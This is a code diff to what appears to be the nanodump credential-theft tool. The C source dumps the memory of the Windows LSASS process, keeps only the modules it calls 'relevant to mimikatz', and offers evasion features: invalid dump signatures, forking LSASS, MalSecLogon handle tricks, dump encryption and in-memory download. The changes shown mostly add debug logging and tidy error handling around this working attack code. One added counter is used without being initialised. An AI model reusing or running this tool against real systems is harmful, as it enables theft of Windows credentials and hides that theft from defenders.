@@ -45,10 +45,13 @@ BOOL write_header(
     Pdump_context dc
 )
 {
+    DPRINT("Writing header");
     MiniDumpHeader header;
-    // the signature might or might not be valid
+    DPRINT("Signature: 0x%x", dc->Signature);
     header.Signature = dc->Signature;
+    DPRINT("Version: %hu", dc->Version);
     header.Version = dc->Version;
+    DPRINT("ImplementationVersion: %hu", dc->ImplementationVersion);
     header.ImplementationVersion = dc->ImplementationVersion;
     header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
     header.StreamDirectoryRva = SIZE_OF_HEADER;
@@ -69,7 +72,10 @@ BOOL write_header(
     memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
     memcpy(header_bytes + offset, &header.Flags, 4);
     if (!append(dc, header_bytes, SIZE_OF_HEADER))
+    {
+        DPRINT_ERR("Failed to write header");
         return FALSE;
+    }
 
     return TRUE;
 }
@@ -94,26 +100,38 @@ BOOL write_directories(
     Pdump_context dc
 )
 {
+    DPRINT("Writing directory: SystemInfoStream");
     MiniDumpDirectory system_info_directory;
     system_info_directory.StreamType = SystemInfoStream;
     system_info_directory.DataSize = 0; // this is calculated and written later
     system_info_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, system_info_directory))
+    {
+        DPRINT_ERR("Failed to write directory");
         return FALSE;
+    }
 
+    DPRINT("Writing directory: ModuleListStream");
     MiniDumpDirectory module_list_directory;
     module_list_directory.StreamType = ModuleListStream;
     module_list_directory.DataSize = 0; // this is calculated and written later
     module_list_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, module_list_directory))
+    {
+        DPRINT_ERR("Failed to write directory");
         return FALSE;
+    }
 
+    DPRINT("Writing directory: Memory64ListStream");
     MiniDumpDirectory memory64_list_directory;
     memory64_list_directory.StreamType = Memory64ListStream;
     memory64_list_directory.DataSize = 0; // this is calculated and written later
     memory64_list_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, memory64_list_directory))
+    {
+        DPRINT_ERR("Failed to write directory");
         return FALSE;
+    }
 
     return TRUE;
 }
@@ -123,6 +141,8 @@ BOOL write_system_info_stream(
 )
 {
     MiniDumpSystemInfo system_info;
+
+    DPRINT("Writing SystemInfoStream");
 
     // read the version and build numbers from the PEB
     PVOID pPeb;
@@ -138,6 +158,10 @@ BOOL write_system_info_stream(
     OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
     CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
     system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
+    DPRINT("OSMajorVersion: %d", *OSMajorVersion);
+    DPRINT("OSMinorVersion: %d", *OSMinorVersion);
+    DPRINT("OSBuildNumber: %d", *OSBuildNumber);
+    DPRINT("CSDVersion: %ls", CSDVersion->Buffer);
 
     system_info.ProcessorLevel = 0;
     system_info.ProcessorRevision = 0;
@@ -195,7 +219,10 @@ BOOL write_system_info_stream(
 
     ULONG32 stream_rva = dc->rva;
     if (!append(dc, system_info_bytes, stream_size))
+    {
+        DPRINT_ERR("Failed to write the SystemInfoStream");
         return FALSE;
+    }
 
     // write our length in the MiniDumpSystemInfo directory
     writeat(dc, SIZE_OF_HEADER + 4, &stream_size, 4); // header + streamType
@@ -208,10 +235,16 @@ BOOL write_system_info_stream(
     ULONG32 Length = CSDVersion->Length;
     // write the length
     if (!append(dc, &Length, 4))
+    {
+        DPRINT_ERR("Failed to write the SystemInfoStream");
         return FALSE;
+    }
     // write the service pack name
     if (!append(dc, CSDVersion->Buffer, CSDVersion->Length))
+    {
+        DPRINT_ERR("Failed to write the SystemInfoStream");
         return FALSE;
+    }
     // write the service pack RVA in the SystemInfoStream
     writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva
 
@@ -222,6 +255,8 @@ Pmodule_info write_module_list_stream(
     Pdump_context dc
 )
 {
+    DPRINT("Writing the ModuleListStream");
+
     // list of modules relevant to mimikatz
     wchar_t* important_modules[] = {
         L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
@@ -236,7 +271,10 @@ Pmodule_info write_module_list_stream(
         TRUE
     );
     if (!module_list)
+    {
+        DPRINT_ERR("Failed to write the ModuleListStream");
         return NULL;
+    }
 
     // write the full path of each dll
     Pmodule_info curr_module = module_list;
@@ -251,12 +289,14 @@ Pmodule_info write_module_list_stream(
         // write the length of the name
         if (!append(dc, &full_name_length, 4))
         {
+            DPRINT_ERR("Failed to write the ModuleListStream");
             free_linked_list(module_list); module_list = NULL;
             return NULL;
         }
         // write the path
         if (!append(dc, curr_module->dll_name, full_name_length))
         {
+            DPRINT_ERR("Failed to write the ModuleListStream");
             free_linked_list(module_list); module_list = NULL;
             return NULL;
         }
@@ -267,6 +307,7 @@ Pmodule_info write_module_list_stream(
     // write the number of modules
     if (!append(dc, &number_of_modules, 4))
     {
+        DPRINT_ERR("Failed to write the ModuleListStream");
         free_linked_list(module_list); module_list = NULL;
         return NULL;
     }
@@ -328,6 +369,7 @@ Pmodule_info write_module_list_stream(
 
         if (!append(dc, module_bytes, sizeof(module_bytes)))
         {
+            DPRINT_ERR("Failed to write the ModuleListStream");
             free_linked_list(module_list); module_list = NULL;
             return NULL;
         }
@@ -372,6 +414,9 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     current_address = 0;
     MEMORY_INFORMATION_CLASS mic = 0;
     MEMORY_BASIC_INFORMATION mbi;
+    DWORD number_of_ranges;
+
+    DPRINT("Getting memory ranges to dump");
 
     while (TRUE)
     {
@@ -414,6 +459,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         if(!new_range)
         {
             malloc_failed();
+            DPRINT_ERR("Failed to get memory ranges to dump");
             return NULL;
         }
         new_range->next = NULL;
@@ -434,7 +480,12 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 last_range = last_range->next;
             last_range->next = new_range;
         }
+        number_of_ranges++;
     }
+    DPRINT(
+        "Enumearted %ld ranges of memory",
+        number_of_ranges
+    );
     return ranges_list;
 }
 
@@ -446,12 +497,17 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     PMiniDumpMemoryDescriptor64 memory_ranges;
     ULONG32 stream_rva = dc->rva;
 
+    DPRINT("Writing the Memory64ListStream");
+
     memory_ranges = get_memory_ranges(
         dc,
         module_list
     );
     if (!memory_ranges)
+    {
+        DPRINT_ERR("Failed to write the Memory64ListStream");
         return NULL;
+    }
 
     // write the number of ranges
     PMiniDumpMemoryDescriptor64 curr_range = memory_ranges;
@@ -463,6 +519,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     }
     if (!append(dc, &number_of_ranges, 8))
     {
+        DPRINT_ERR("Failed to write the Memory64ListStream");
         free_linked_list(memory_ranges); memory_ranges = NULL;
         return NULL;
     }
@@ -472,6 +529,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     ULONG64 base_rva = stream_rva + stream_size;
     if (!append(dc, &base_rva, 8))
     {
+        DPRINT_ERR("Failed to write the Memory64ListStream");
         free_linked_list(memory_ranges); memory_ranges = NULL;
         return NULL;
     }
@@ -482,11 +540,13 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     {
         if (!append(dc, &curr_range->StartOfMemoryRange, 8))
         {
+            DPRINT_ERR("Failed to write the Memory64ListStream");
             free_linked_list(memory_ranges); memory_ranges = NULL;
             return NULL;
         }
         if (!append(dc, &curr_range->DataSize, 8))
         {
+            DPRINT_ERR("Failed to write the Memory64ListStream");
             free_linked_list(memory_ranges); memory_ranges = NULL;
             return NULL;
         }
@@ -507,6 +567,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         PBYTE buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
+            DPRINT_ERR("Failed to write the Memory64ListStream");
             malloc_failed();
             return NULL;
         }
@@ -533,6 +594,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         }
         if (!append(dc, buffer, curr_range->DataSize))
         {
+            DPRINT_ERR("Failed to write the Memory64ListStream");
             free_linked_list(memory_ranges); memory_ranges = NULL;
             intFree(buffer); buffer = NULL;
             return NULL;
@@ -550,6 +612,8 @@ BOOL NanoDumpWriteDump(
     Pdump_context dc
 )
 {
+    DPRINT("Writing nanodump");
+
     if (!write_header(dc))
         return FALSE;
 
@@ -625,6 +689,10 @@ void go(char* args, int length)
         if (!lsass_pid)
             return;
     }
+    else
+    {
+        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+    }
 
     if (get_pid_and_leave)
     {
@@ -688,6 +756,8 @@ void go(char* args, int length)
         FALSE,
         dump_path
     );
+    if (!hProcess)
+        return;
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
     if (fork_lsass && use_malseclogon)
@@ -695,6 +765,8 @@ void go(char* args, int length)
         hProcess = make_handle_full_access(
             hProcess
         );
+        if (!hProcess)
+            return;
     }
 
     // avoid reading LSASS directly by making a fork
@@ -704,10 +776,9 @@ void go(char* args, int length)
             0,
             hProcess
         );
+        if (!hProcess)
+            return;
     }
-
-    if (!hProcess)
-        return;
 
     // allocate a chuck of memory to write the dump
     SIZE_T region_size = DUMP_MAX_SIZE;
@@ -738,40 +809,44 @@ void go(char* args, int length)
         kill_created_processes(created_processes);
         created_processes = NULL;
     }
+    if (!success)
+        return;
+
+    DPRINT(
+        "The dump was created successfully, final size: %lld bytes",
+        (ULONG64)dc.rva
+    );
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(&dc);
 
-    if (success)
+    if (write_dump_to_disk)
     {
-        if (write_dump_to_disk)
-        {
-            success = write_file(
-                dump_path,
-                dc.BaseAddress,
-                dc.rva
-            );
-        }
-        else
-        {
-            success = download_file(
-                dump_path,
-                dc.BaseAddress,
-                dc.rva
-            );
-        }
+        success = write_file(
+            dump_path,
+            dc.BaseAddress,
+            dc.rva
+        );
+        if (!success)
+            return;
     }
-
+    else
+    {
+        success = download_file(
+            dump_path,
+            dc.BaseAddress,
+            dc.rva
+        );
+        if (!success)
+            return;
+    }
     erase_dump_from_memory(&dc);
 
-    if (success)
-    {
-        print_success(
-            dump_path,
-            use_valid_sig,
-            write_dump_to_disk
-        );
-    }
+    print_success(
+        dump_path,
+        use_valid_sig,
+        write_dump_to_disk
+    );
 }
 
 #else
@@ -928,6 +1003,10 @@ int main(int argc, char* argv[])
         if (!lsass_pid)
             return -1;
     }
+    else
+    {
+        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+    }
 
     if (get_pid_and_leave)
     {
@@ -988,12 +1067,14 @@ int main(int argc, char* argv[])
     // set the signature
     if (use_valid_sig)
     {
+        DPRINT("Using a valid signature");
         Signature = MINIDUMP_SIGNATURE;
         Version = MINIDUMP_VERSION;
         ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
+        DPRINT("Using a invalid signature");
         generate_invalid_sig(
             &Signature,
             &Version,
@@ -1016,6 +1097,8 @@ int main(int argc, char* argv[])
         is_malseclogon_stage_2,
         dump_path
     );
+    if (!hProcess)
+        return -1;
 
     // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
     if (fork_lsass && use_malseclogon)
@@ -1023,6 +1106,8 @@ int main(int argc, char* argv[])
         hProcess = make_handle_full_access(
             hProcess
         );
+        if (!hProcess)
+            return -1;
     }
 
     // avoid reading LSASS directly by making a fork
@@ -1032,15 +1117,14 @@ int main(int argc, char* argv[])
             0,
             hProcess
         );
+        if (!hProcess)
+            return -1;
     }
-
-    if (!hProcess)
-        return -1;
 
     // allocate a chuck of memory to write the dump
     SIZE_T region_size = DUMP_MAX_SIZE;
-    PVOID BaseAddress = allocate_memory(&region_size);
-    if (!BaseAddress)
+    PVOID base_address = allocate_memory(&region_size);
+    if (!base_address)
     {
         NtClose(hProcess); hProcess = NULL;
         return -1;
@@ -1048,7 +1132,7 @@ int main(int argc, char* argv[])
 
     dump_context dc;
     dc.hProcess = hProcess;
-    dc.BaseAddress = BaseAddress;
+    dc.BaseAddress = base_address;
     dc.rva = 0;
     dc.DumpMaxSize = region_size;
     dc.Signature = Signature;
@@ -1060,44 +1144,42 @@ int main(int argc, char* argv[])
     // close the handle
     NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
 
-
     // if we used MalSecLogon remotely, kill the created processes
     if (use_malseclogon_remotely)
     {
         kill_created_processes(created_processes);
         created_processes = NULL;
     }
+    if (!success)
+        return -1;
+
+    DPRINT(
+        "The dump was created successfully, final size: %lld bytes",
+        (ULONG64)dc.rva
+    );
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(&dc);
 
-    if (success)
-    {
-        success = write_file(
-            dump_path,
-            dc.BaseAddress,
-            dc.rva
-        );
-    }
+    success = write_file(
+        dump_path,
+        dc.BaseAddress,
+        dc.rva
+    );
+    if (!success)
+        return -1;
 
     erase_dump_from_memory(&dc);
 
-    if (success)
+    if (!is_malseclogon_stage_2)
     {
-        if (!is_malseclogon_stage_2)
-        {
-            print_success(
-                dump_path,
-                use_valid_sig,
-                TRUE
-            );
-        }
-        return 0;
+        print_success(
+            dump_path,
+            use_valid_sig,
+            TRUE
+        );
     }
-    else
-    {
-        return -1;
-    }
+    return 0;
 }
 
 #endif
